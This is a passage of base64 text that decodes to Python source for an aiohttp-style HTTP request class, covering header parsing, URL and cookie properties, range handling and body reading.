pbiBzZWxmLl9tZXNzYWdlLmhlYWRlcnMuZ2V0YWxsKGhkcnMuRk9SV0FSREVELCAoKSk6XHJcbiAgICAgICAgICAgIGxlbmd0aCA9IGxlbihmaWVsZF92YWx1ZSlcclxuICAgICAgICAgICAgcG9zID0gMFxyXG4gICAgICAgICAgICBuZWVkX3NlcGFyYXRvciA9IEZhbHNlXHJcbiAgICAgICAgICAgIGVsZW0gPSB7fSAgIyB0eXBlOiBEaWN0W3N0ciwgc3RyXVxyXG4gICAgICAgICAgICBlbGVtcy5hcHBlbmQodHlwZXMuTWFwcGluZ1Byb3h5VHlwZShlbGVtKSlcclxuICAgICAgICAgICAgd2hpbGUgMCA8PSBwb3MgPCBsZW5ndGg6XHJcbiAgICAgICAgICAgICAgICBtYXRjaCA9IF9GT1JXQVJERURfUEFJUl9SRS5tYXRjaChmaWVsZF92YWx1ZSwgcG9zKVxyXG4gICAgICAgICAgICAgICAgaWYgbWF0Y2ggaXMgbm90IE5vbmU6ICAjIGdvdCBhIHZhbGlkIGZvcndhcmRlZC1wYWlyXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbmVlZF9zZXBhcmF0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICMgYmFkIHN5bnRheCBoZXJlLCBza2lwIHRvIG5leHQgY29tbWFcclxuICAgICAgICAgICAgICAgICAgICAgICAgcG9zID0gZmllbGRfdmFsdWUuZmluZCgiLCIsIHBvcylcclxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBuYW1lLCB2YWx1ZSwgcG9ydCA9IG1hdGNoLmdyb3VwcygpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHZhbHVlWzBdID09IFwnIlwnOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBxdW90ZWQgc3RyaW5nOiByZW1vdmUgcXVvdGVzIGFuZCB1bmVzY2FwZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBfUVVPVEVEX1BBSVJfUkVQTEFDRV9SRS5zdWIociJcXDEiLCB2YWx1ZVsxOi0xXSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgcG9ydDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlICs9IHBvcnRcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbVtuYW1lLmxvd2VyKCldID0gdmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgcG9zICs9IGxlbihtYXRjaC5ncm91cCgwKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgbmVlZF9zZXBhcmF0b3IgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBlbGlmIGZpZWxkX3ZhbHVlW3Bvc10gPT0gIiwiOiAgIyBuZXh0IGZvcndhcmRlZC1lbGVtZW50XHJcbiAgICAgICAgICAgICAgICAgICAgbmVlZF9zZXBhcmF0b3IgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIGVsZW0gPSB7fVxyXG4gICAgICAgICAgICAgICAgICAgIGVsZW1zLmFwcGVuZCh0eXBlcy5NYXBwaW5nUHJveHlUeXBlKGVsZW0pKVxyXG4gICAgICAgICAgICAgICAgICAgIHBvcyArPSAxXHJcbiAgICAgICAgICAgICAgICBlbGlmIGZpZWxkX3ZhbHVlW3Bvc10gPT0gIjsiOiAgIyBuZXh0IGZvcndhcmRlZC1wYWlyXHJcbiAgICAgICAgICAgICAgICAgICAgbmVlZF9zZXBhcmF0b3IgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgICAgIHBvcyArPSAxXHJcbiAgICAgICAgICAgICAgICBlbGlmIGZpZWxkX3ZhbHVlW3Bvc10gaW4gIiBcXHQiOlxyXG4gICAgICAgICAgICAgICAgICAgICMgQWxsb3cgd2hpdGVzcGFjZSBldmVuIGJldHdlZW4gZm9yd2FyZGVkLXBhaXJzLCB0aG91Z2hcclxuICAgICAgICAgICAgICAgICAgICAjIFJGQyA3MjM5IGRvZXNuXCd0LiBUaGlzIHNpbXBsaWZpZXMgY29kZSBhbmQgaXMgaW4gbGluZVxyXG4gICAgICAgICAgICAgICAgICAgICMgd2l0aCBQb3N0ZWxcJ3MgbGF3LlxyXG4gICAgICAgICAgICAgICAgICAgIHBvcyArPSAxXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICMgYmFkIHN5bnRheCBoZXJlLCBza2lwIHRvIG5leHQgY29tbWFcclxuICAgICAgICAgICAgICAgICAgICBwb3MgPSBmaWVsZF92YWx1ZS5maW5kKCIsIiwgcG9zKVxyXG4gICAgICAgIHJldHVybiB0dXBsZShlbGVtcylcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBzY2hlbWUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIkEgc3RyaW5nIHJlcHJlc2VudGluZyB0aGUgc2NoZW1lIG9mIHRoZSByZXF1ZXN0LlxyXG5cclxuICAgICAgICBIb3N0bmFtZSBpcyByZXNvbHZlZCBpbiB0aGlzIG9yZGVyOlxyXG5cclxuICAgICAgICAtIG92ZXJyaWRkZW4gdmFsdWUgYnkgLmNsb25lKHNjaGVtZT1uZXdfc2NoZW1lKSBjYWxsLlxyXG4gICAgICAgIC0gdHlwZSBvZiBjb25uZWN0aW9uIHRvIHBlZXI6IEhUVFBTIGlmIHNvY2tldCBpcyBTU0wsIEhUVFAgb3RoZXJ3aXNlLlxyXG5cclxuICAgICAgICBcJ2h0dHBcJyBvciBcJ2h0dHBzXCcuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fdHJhbnNwb3J0X3NzbGNvbnRleHQ6XHJcbiAgICAgICAgICAgIHJldHVybiAiaHR0cHMiXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuICJodHRwIlxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIG1ldGhvZChzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiUmVhZCBvbmx5IHByb3BlcnR5IGZvciBnZXR0aW5nIEhUVFAgbWV0aG9kLlxyXG5cclxuICAgICAgICBUaGUgdmFsdWUgaXMgdXBwZXItY2FzZWQgc3RyIGxpa2UgXCdHRVRcJywgXCdQT1NUXCcsIFwnUFVUXCcgZXRjLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9tZXRob2RcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiB2ZXJzaW9uKHNlbGYpIC0+IEh0dHBWZXJzaW9uOlxyXG4gICAgICAgICIiIlJlYWQgb25seSBwcm9wZXJ0eSBmb3IgZ2V0dGluZyBIVFRQIHZlcnNpb24gb2YgcmVxdWVzdC5cclxuXHJcbiAgICAgICAgUmV0dXJucyBhaW9odHRwLnByb3RvY29sLkh0dHBWZXJzaW9uIGluc3RhbmNlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92ZXJzaW9uXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaG9zdChzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiSG9zdG5hbWUgb2YgdGhlIHJlcXVlc3QuXHJcblxyXG4gICAgICAgIEhvc3RuYW1lIGlzIHJlc29sdmVkIGluIHRoaXMgb3JkZXI6XHJcblxyXG4gICAgICAgIC0gb3ZlcnJpZGRlbiB2YWx1ZSBieSAuY2xvbmUoaG9zdD1uZXdfaG9zdCkgY2FsbC5cclxuICAgICAgICAtIEhPU1QgSFRUUCBoZWFkZXJcclxuICAgICAgICAtIHNvY2tldC5nZXRmcWRuKCkgdmFsdWVcclxuICAgICAgICAiIiJcclxuICAgICAgICBob3N0ID0gc2VsZi5fbWVzc2FnZS5oZWFkZXJzLmdldChoZHJzLkhPU1QpXHJcbiAgICAgICAgaWYgaG9zdCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIGhvc3RcclxuICAgICAgICByZXR1cm4gc29ja2V0LmdldGZxZG4oKVxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHJlbW90ZShzZWxmKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgICAgICIiIlJlbW90ZSBJUCBvZiBjbGllbnQgaW5pdGlhdGVkIEhUVFAgcmVxdWVzdC5cclxuXHJcbiAgICAgICAgVGhlIElQIGlzIHJlc29sdmVkIGluIHRoaXMgb3JkZXI6XHJcblxyXG4gICAgICAgIC0gb3ZlcnJpZGRlbiB2YWx1ZSBieSAuY2xvbmUocmVtb3RlPW5ld19yZW1vdGUpIGNhbGwuXHJcbiAgICAgICAgLSBwZWVybmFtZSBvZiBvcGVuZWQgc29ja2V0XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5fdHJhbnNwb3J0X3BlZXJuYW1lIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLl90cmFuc3BvcnRfcGVlcm5hbWUsIChsaXN0LCB0dXBsZSkpOlxyXG4gICAgICAgICAgICByZXR1cm4gc3RyKHNlbGYuX3RyYW5zcG9ydF9wZWVybmFtZVswXSlcclxuICAgICAgICByZXR1cm4gc3RyKHNlbGYuX3RyYW5zcG9ydF9wZWVybmFtZSlcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiB1cmwoc2VsZikgLT4gVVJMOlxyXG4gICAgICAgIHVybCA9IFVSTC5idWlsZChzY2hlbWU9c2VsZi5zY2hlbWUsIGhvc3Q9c2VsZi5ob3N0KVxyXG4gICAgICAgIHJldHVybiB1cmwuam9pbihzZWxmLl9yZWxfdXJsKVxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHBhdGgoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlRoZSBVUkwgaW5jbHVkaW5nICpQQVRIIElORk8qIHdpdGhvdXQgdGhlIGhvc3Qgb3Igc2NoZW1lLlxyXG5cclxuICAgICAgICBFLmcuLCBgYC9hcHAvYmxvZ2BgXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlbF91cmwucGF0aFxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHBhdGhfcXMoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlRoZSBVUkwgaW5jbHVkaW5nIFBBVEhfSU5GTyBhbmQgdGhlIHF1ZXJ5IHN0cmluZy5cclxuXHJcbiAgICAgICAgRS5nLCAvYXBwL2Jsb2c/aWQ9MTBcclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc3RyKHNlbGYuX3JlbF91cmwpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgcmF3X3BhdGgoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlRoZSBVUkwgaW5jbHVkaW5nIHJhdyAqUEFUSCBJTkZPKiB3aXRob3V0IHRoZSBob3N0IG9yIHNjaGVtZS5cclxuXHJcbiAgICAgICAgV2FybmluZywgdGhlIHBhdGggaXMgdW5xdW90ZWQgYW5kIG1heSBjb250YWlucyBub24gdmFsaWQgVVJMIGNoYXJhY3RlcnNcclxuXHJcbiAgICAgICAgRS5nLiwgYGAvbXklMkZwYXRoJTdDd2l0aCUyMXNvbWUlMjVzdHJhbmdlJTI0Y2hhcmFjdGVyc2BgXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX21lc3NhZ2UucGF0aFxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIHF1ZXJ5KHNlbGYpIC0+ICJNdWx0aURpY3RQcm94eVtzdHJdIjpcclxuICAgICAgICAiIiJBIG11bHRpZGljdCB3aXRoIGFsbCB0aGUgdmFyaWFibGVzIGluIHRoZSBxdWVyeSBzdHJpbmcuIiIiXHJcbiAgICAgICAgcmV0dXJuIE11bHRpRGljdFByb3h5KHNlbGYuX3JlbF91cmwucXVlcnkpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgcXVlcnlfc3RyaW5nKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJUaGUgcXVlcnkgc3RyaW5nIGluIHRoZSBVUkwuXHJcblxyXG4gICAgICAgIEUuZy4sIGlkPTEwXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlbF91cmwucXVlcnlfc3RyaW5nXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaGVhZGVycyhzZWxmKSAtPiAiQ0lNdWx0aURpY3RQcm94eVtzdHJdIjpcclxuICAgICAgICAiIiJBIGNhc2UtaW5zZW5zaXRpdmUgbXVsdGlkaWN0IHByb3h5IHdpdGggYWxsIGhlYWRlcnMuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2hlYWRlcnNcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiByYXdfaGVhZGVycyhzZWxmKSAtPiBSYXdIZWFkZXJzOlxyXG4gICAgICAgICIiIkEgc2VxdWVuY2Ugb2YgcGFpcnMgZm9yIGFsbCBoZWFkZXJzLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9tZXNzYWdlLnJhd19oZWFkZXJzXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaWZfbW9kaWZpZWRfc2luY2Uoc2VsZikgLT4gT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBJZi1Nb2RpZmllZC1TaW5jZSBIVFRQIGhlYWRlciwgb3IgTm9uZS5cclxuXHJcbiAgICAgICAgVGhpcyBoZWFkZXIgaXMgcmVwcmVzZW50ZWQgYXMgYSBgZGF0ZXRpbWVgIG9iamVjdC5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gcGFyc2VfaHR0cF9kYXRlKHNlbGYuaGVhZGVycy5nZXQoaGRycy5JRl9NT0RJRklFRF9TSU5DRSkpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaWZfdW5tb2RpZmllZF9zaW5jZShzZWxmKSAtPiBPcHRpb25hbFtkYXRldGltZS5kYXRldGltZV06XHJcbiAgICAgICAgIiIiVGhlIHZhbHVlIG9mIElmLVVubW9kaWZpZWQtU2luY2UgSFRUUCBoZWFkZXIsIG9yIE5vbmUuXHJcblxyXG4gICAgICAgIFRoaXMgaGVhZGVyIGlzIHJlcHJlc2VudGVkIGFzIGEgYGRhdGV0aW1lYCBvYmplY3QuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHBhcnNlX2h0dHBfZGF0ZShzZWxmLmhlYWRlcnMuZ2V0KGhkcnMuSUZfVU5NT0RJRklFRF9TSU5DRSkpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9ldGFnX3ZhbHVlcyhldGFnX2hlYWRlcjogc3RyKSAtPiBJdGVyYXRvcltFVGFnXTpcclxuICAgICAgICAiIiJFeHRyYWN0IGBFVGFnYCBvYmplY3RzIGZyb20gcmF3IGhlYWRlci4iIiJcclxuICAgICAgICBpZiBldGFnX2hlYWRlciA9PSBFVEFHX0FOWTpcclxuICAgICAgICAgICAgeWllbGQgRVRhZyhcclxuICAgICAgICAgICAgICAgIGlzX3dlYWs9RmFsc2UsXHJcbiAgICAgICAgICAgICAgICB2YWx1ZT1FVEFHX0FOWSxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGZvciBtYXRjaCBpbiBMSVNUX1FVT1RFRF9FVEFHX1JFLmZpbmRpdGVyKGV0YWdfaGVhZGVyKTpcclxuICAgICAgICAgICAgICAgIGlzX3dlYWssIHZhbHVlLCBnYXJiYWdlID0gbWF0Y2guZ3JvdXAoMiwgMywgNClcclxuICAgICAgICAgICAgICAgICMgQW55IHN5bWJvbCBjYXB0dXJlZCBieSA0dGggZ3JvdXAgbWVhbnNcclxuICAgICAgICAgICAgICAgICMgdGhhdCB0aGUgZm9sbG93aW5nIHNlcXVlbmNlIGlzIGludmFsaWQuXHJcbiAgICAgICAgICAgICAgICBpZiBnYXJiYWdlOlxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgICAgICAgICAgeWllbGQgRVRhZyhcclxuICAgICAgICAgICAgICAgICAgICBpc193ZWFrPWJvb2woaXNfd2VhayksXHJcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU9dmFsdWUsXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgX2lmX21hdGNoX29yX25vbmVfaW1wbChcclxuICAgICAgICBjbHMsIGhlYWRlcl92YWx1ZTogT3B0aW9uYWxbc3RyXVxyXG4gICAgKSAtPiBPcHRpb25hbFtUdXBsZVtFVGFnLCAuLi5dXTpcclxuICAgICAgICBpZiBub3QgaGVhZGVyX3ZhbHVlOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgICAgICByZXR1cm4gdHVwbGUoY2xzLl9ldGFnX3ZhbHVlcyhoZWFkZXJfdmFsdWUpKVxyXG5cclxuICAgIEByZWlmeVxyXG4gICAgZGVmIGlmX21hdGNoKHNlbGYpIC0+IE9wdGlvbmFsW1R1cGxlW0VUYWcsIC4uLl1dOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBJZi1NYXRjaCBIVFRQIGhlYWRlciwgb3IgTm9uZS5cclxuXHJcbiAgICAgICAgVGhpcyBoZWFkZXIgaXMgcmVwcmVzZW50ZWQgYXMgYSBgdHVwbGVgIG9mIGBFVGFnYCBvYmplY3RzLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pZl9tYXRjaF9vcl9ub25lX2ltcGwoc2VsZi5oZWFkZXJzLmdldChoZHJzLklGX01BVENIKSlcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBpZl9ub25lX21hdGNoKHNlbGYpIC0+IE9wdGlvbmFsW1R1cGxlW0VUYWcsIC4uLl1dOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBJZi1Ob25lLU1hdGNoIEhUVFAgaGVhZGVyLCBvciBOb25lLlxyXG5cclxuICAgICAgICBUaGlzIGhlYWRlciBpcyByZXByZXNlbnRlZCBhcyBhIGB0dXBsZWAgb2YgYEVUYWdgIG9iamVjdHMuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2lmX21hdGNoX29yX25vbmVfaW1wbChzZWxmLmhlYWRlcnMuZ2V0KGhkcnMuSUZfTk9ORV9NQVRDSCkpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaWZfcmFuZ2Uoc2VsZikgLT4gT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdOlxyXG4gICAgICAgICIiIlRoZSB2YWx1ZSBvZiBJZi1SYW5nZSBIVFRQIGhlYWRlciwgb3IgTm9uZS5cclxuXHJcbiAgICAgICAgVGhpcyBoZWFkZXIgaXMgcmVwcmVzZW50ZWQgYXMgYSBgZGF0ZXRpbWVgIG9iamVjdC5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gcGFyc2VfaHR0cF9kYXRlKHNlbGYuaGVhZGVycy5nZXQoaGRycy5JRl9SQU5HRSkpXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYga2VlcF9hbGl2ZShzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIklzIGtlZXBhbGl2ZSBlbmFibGVkIGJ5IGNsaWVudD8iIiJcclxuICAgICAgICByZXR1cm4gbm90IHNlbGYuX21lc3NhZ2Uuc2hvdWxkX2Nsb3NlXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgY29va2llcyhzZWxmKSAtPiBNYXBwaW5nW3N0ciwgc3RyXTpcclxuICAgICAgICAiIiJSZXR1cm4gcmVxdWVzdCBjb29raWVzLlxyXG5cclxuICAgICAgICBBIHJlYWQtb25seSBkaWN0aW9uYXJ5LWxpa2Ugb2JqZWN0LlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJhdyA9IHNlbGYuaGVhZGVycy5nZXQoaGRycy5DT09LSUUsICIiKVxyXG4gICAgICAgIHBhcnNlZCA9IFNpbXBsZUNvb2tpZShyYXcpICAjIHR5cGU6IFNpbXBsZUNvb2tpZVtzdHJdXHJcbiAgICAgICAgcmV0dXJuIE1hcHBpbmdQcm94eVR5cGUoe2tleTogdmFsLnZhbHVlIGZvciBrZXksIHZhbCBpbiBwYXJzZWQuaXRlbXMoKX0pXHJcblxyXG4gICAgQHJlaWZ5XHJcbiAgICBkZWYgaHR0cF9yYW5nZShzZWxmKSAtPiBzbGljZTpcclxuICAgICAgICAiIiJUaGUgY29udGVudCBvZiBSYW5nZSBIVFRQIGhlYWRlci5cclxuXHJcbiAgICAgICAgUmV0dXJuIGEgc2xpY2UgaW5zdGFuY2UuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJuZyA9IHNlbGYuX2hlYWRlcnMuZ2V0KGhkcnMuUkFOR0UpXHJcbiAgICAgICAgc3RhcnQsIGVuZCA9IE5vbmUsIE5vbmVcclxuICAgICAgICBpZiBybmcgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHBhdHRlcm4gPSByIl5ieXRlcz0oXFxkKiktKFxcZCopJCJcclxuICAgICAgICAgICAgICAgIHN0YXJ0LCBlbmQgPSByZS5maW5kYWxsKHBhdHRlcm4sIHJuZylbMF1cclxuICAgICAgICAgICAgZXhjZXB0IEluZGV4RXJyb3I6ICAjIHBhdHRlcm4gd2FzIG5vdCBmb3VuZCBpbiBoZWFkZXJcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInJhbmdlIG5vdCBpbiBhY2NlcHRhYmxlIGZvcm1hdCIpXHJcblxyXG4gICAgICAgICAgICBlbmQgPSBpbnQoZW5kKSBpZiBlbmQgZWxzZSBOb25lXHJcbiAgICAgICAgICAgIHN0YXJ0ID0gaW50KHN0YXJ0KSBpZiBzdGFydCBlbHNlIE5vbmVcclxuXHJcbiAgICAgICAgICAgIGlmIHN0YXJ0IGlzIE5vbmUgYW5kIGVuZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICMgZW5kIHdpdGggbm8gc3RhcnQgaXMgdG8gcmV0dXJuIHRhaWwgb2YgY29udGVudFxyXG4gICAgICAgICAgICAgICAgc3RhcnQgPSAtZW5kXHJcbiAgICAgICAgICAgICAgICBlbmQgPSBOb25lXHJcblxyXG4gICAgICAgICAgICBpZiBzdGFydCBpcyBub3QgTm9uZSBhbmQgZW5kIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgIyBlbmQgaXMgaW5jbHVzaXZlIGluIHJhbmdlIGhlYWRlciwgZXhjbHVzaXZlIGZvciBzbGljZVxyXG4gICAgICAgICAgICAgICAgZW5kICs9IDFcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBzdGFydCA+PSBlbmQ6XHJcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigic3RhcnQgY2Fubm90IGJlIGFmdGVyIGVuZCIpXHJcblxyXG4gICAgICAgICAgICBpZiBzdGFydCBpcyBlbmQgaXMgTm9uZTogICMgTm8gdmFsaWQgcmFuZ2Ugc3VwcGxpZWRcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIk5vIHN0YXJ0IG9yIGVuZCBvZiByYW5nZSBzcGVjaWZpZWQiKVxyXG5cclxuICAgICAgICByZXR1cm4gc2xpY2Uoc3RhcnQsIGVuZCwgMSlcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBjb250ZW50KHNlbGYpIC0+IFN0cmVhbVJlYWRlcjpcclxuICAgICAgICAiIiJSZXR1cm4gcmF3IHBheWxvYWQgc3RyZWFtLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wYXlsb2FkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaGFzX2JvZHkoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICAiIiJSZXR1cm4gVHJ1ZSBpZiByZXF1ZXN0XCdzIEhUVFAgQk9EWSBjYW4gYmUgcmVhZCwgRmFsc2Ugb3RoZXJ3aXNlLiIiIlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJEZXByZWNhdGVkLCB1c2UgLmNhbl9yZWFkX2JvZHkgIzIwMDUiLCBEZXByZWNhdGlvbldhcm5pbmcsIHN0YWNrbGV2ZWw9MlxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gbm90IHNlbGYuX3BheWxvYWQuYXRfZW9mKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjYW5fcmVhZF9ib2R5KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiUmV0dXJuIFRydWUgaWYgcmVxdWVzdFwncyBIVFRQIEJPRFkgY2FuIGJlIHJlYWQsIEZhbHNlIG90aGVyd2lzZS4iIiJcclxuICAgICAgICByZXR1cm4gbm90IHNlbGYuX3BheWxvYWQuYXRfZW9mKClcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBib2R5X2V4aXN0cyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIlJldHVybiBUcnVlIGlmIHJlcXVlc3QgaGFzIEhUVFAgQk9EWSwgRmFsc2Ugb3RoZXJ3aXNlLiIiIlxyXG4gICAgICAgIHJldHVybiB0eXBlKHNlbGYuX3BheWxvYWQpIGlzIG5vdCBFbXB0eVN0cmVhbVJlYWRlclxyXG5cclxuICAgIGFzeW5jIGRlZiByZWxlYXNlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiUmVsZWFzZSByZXF1ZXN0LlxyXG5cclxuICAgICAgICBFYXQgdW5yZWFkIHBhcnQgb2YgSFRUUCBCT0RZIGlmIHByZXNlbnQuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgd2hpbGUgbm90IHNlbGYuX3BheWxvYWQuYXRfZW9mKCk6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3BheWxvYWQucmVhZGFueSgpXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWQoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiUmVhZCByZXF1ZXN0IGJvZHkgaWYgcHJlc2VudC5cclxuXHJcbiAgICAgICAgUmV0dXJucyBieXRlcyBvYmplY3Qgd2l0aCBmdWxsIHJlcXVlc3QgY29udGVudC5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBzZWxmLl9yZWFkX2J5dGVzIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGJvZHkgPSBieXRlYXJyYXkoKVxyXG4gICAgICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICAgICAgY2h1bmsgPSBhd2FpdCBzZWxmLl9wYXlsb2FkLnJlYWRhbnkoKVxyXG4gICAgICAgICAgICAgICAgYm9keS5leHRlbmQoY2h1bmspXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9jbGllbnRfbWF4X3NpemU6XHJcbiAgICAgICAgICAgICAgICAgICAgYm9keV9zaXplID0gbGVuKGJvZHkpXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgYm9keV9zaXplID49IHNlbGYuX2NsaWVudF9tYXhfc2l6ZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgSFRUUFJlcXVlc3RFbnRpdHlUb29MYXJnZShcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1heF9zaXplPXNlbGYuX2NsaWVudF9tYXhfc2l6ZSwgYWN0dWFsX3NpemU9Ym9keV9zaXplXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBjaHVuazpcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICBzZWxmLl9yZWFkX2J5dGVzID0gYnl0ZXMoYm9keSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhZF9ieXRlc1xyXG5cclxuICAgIGFzeW5jIGRlZiB0ZXh0KHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJSZXR1cm4gQk9EWSBhcyB0ZXh0IHVzaW5nIGVuY29kaW5nIGZyb20gLmNoYXJzZXQuIiIiXHJcbiAgICAgICAgYnl0ZXNfYm9keSA9IGF3YWl0IHNlbGYucmVhZCgpXHJcbiAgICAgICAgZW5jb2RpbmcgPSBzZWxmLmNoYXJzZXQgb3IgInV0Zi04IlxyXG4gICAgICAgIHJldHVybiBieXRlc19ib2R5LmRlY29kZShlbmNvZGluZylcclxuXHJcbiAgICBhc3luYyBkZWYganNvbihzZWxmLCAqLCBsb2FkczogSlNPTkRlY29kZXIgPSBERUZBVUxUX0pTT05fREVDT0RFUikgLT4gQW55OlxyXG4gICAgICAgICIiIlJldHVybiBCT0RZIGFzIEpTT04uIiIiXHJcbiAgICAgICAgYm9keSA9IGF3YWl0IHNlbGYudGV4dCgpXHJcbiAgICAgICAgcmV0dXJuIGxvYWRzKGJvZHkpXH